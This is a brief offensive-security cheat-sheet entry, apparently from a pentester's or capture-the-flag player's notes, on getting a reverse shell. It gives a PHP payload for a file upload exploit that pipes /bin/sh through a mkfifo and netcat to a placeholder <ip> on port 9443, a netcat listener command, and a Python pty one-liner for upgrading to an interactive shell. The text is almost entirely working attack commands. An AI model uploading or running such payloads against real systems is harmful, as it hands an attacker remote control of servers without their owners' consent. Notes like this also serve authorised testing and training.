#reverse_shell

file upload exploit -> 
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 9443 >/tmp/f"); ?>
```
netcat listening
```
nc -lvnp 9443
```

interactive shell with python
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

[[privilege scalation]]